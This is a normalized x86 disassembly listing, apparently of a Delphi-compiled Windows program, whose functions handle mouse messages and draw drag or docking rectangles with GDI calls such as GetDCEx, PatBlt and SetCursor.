mov eax edi
call sub_4032a8
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_456a5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_451be8
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407fd4
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_455490
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_451b54
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_455490
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_456e78
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_456ff0
xor edx edx
mov eax edi
call sub_45581c
sub_456b38
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_455468
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a78
mov edx eax
mov eax ebx
call sub_455490
sub_456b74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_456bdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456be6
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_456bec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_456c9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4551f8
mov eax [ ebp - 0x8 ]
call sub_456b74
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_456bec
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ca2
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_456bec
pop ecx
sub_456ca8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456de1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456d90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_451b54
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d97
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_456b74
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_451b68
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_456d97
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_456bec
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456de8
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_456df0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_455540
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455568
call sub_456df0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455540
call sub_456df0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_454f70
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_455468
mov edx eax
mov eax ebx
call sub_455490
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_455490
jmp r-xdata
sub_456e78
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_456df0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_456ebc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_455468
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_455490
sub_456eec
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4530b8
mov edx eax
mov eax [ rw-data ]
call sub_457a58
mov eax [ ebx + 0x14 ]
call sub_4530b8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_457000
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_456f4c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_457a58
mov eax ebx
call sub_457000
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_455490
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_455490
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_456e78
push ebx
push sub_456ff0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_45581c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_456fc8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_451b54
test eax eax
jle r-xdata
push ebx
push sub_456ff0
xor edx edx
mov eax ebx
call sub_45581c
sub_457000
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_455034
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_455034
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4550a0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4550a0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424ca4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_4570ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4570ec
pop ecx
mov eax ebx
call sub_455468
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_455468
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4570ec
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_455468
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42be94
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45717c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455468
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_454fec
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_455468
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_4570ec
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4571cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44c214
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44c214
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_457248
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_454ef8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_454fa4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_45554c
test eax eax
je r-xdata
mov eax esi
call sub_454f70
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_456ff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_45581c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45554c
mov edx [ ebx + 0x20 ]
call sub_4554a4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_457248
pop ecx
sub_4572c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_454f54
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_454f54
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_45554c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4572c8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_456ff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_45581c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_455150
mov eax edi
call sub_455540
test eax eax
je r-xdata
mov eax edi
call sub_45554c
mov esi eax
mov eax esi
call sub_455468
push eax
mov eax esi
call sub_454fa4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_455540
call sub_455468
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_455468
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_455490
mov eax esi
call sub_455468
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_455490
mov eax edi
call sub_45554c
call sub_4554e0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_454fa4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_455490
mov eax edi
call sub_455540
call sub_4554e0
mov bl 0x1
jmp r-xdata
sub_457400
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4557b4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41725c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455fa8
test eax eax
je r-xdata
push ebp
call sub_457248
pop ecx
push ebp
call sub_4572c8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4571cc
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_457488
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_455034
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_455034
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45717c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45717c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_457518
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4578f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406d24
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455fa8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_456f4c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d24
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455fa8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44c3b8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578f7
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4530b8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_44b0ac
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44d5c4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404038
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_457400
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_451be8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_457000
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406d24
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_457488
pop ecx
mov eax [ ebp - 0x4 ]
call sub_457000
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d24
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455fa8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_44c794
jmp r-xdata
mov eax edi
call sub_4698a0
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455fa8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44c214
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_44c874
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40408c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456eec
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4530b8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44cf6c
jmp r-xdata
sub_457900
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_457a80
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_457990
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_457a58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_457a00
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_457a30
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
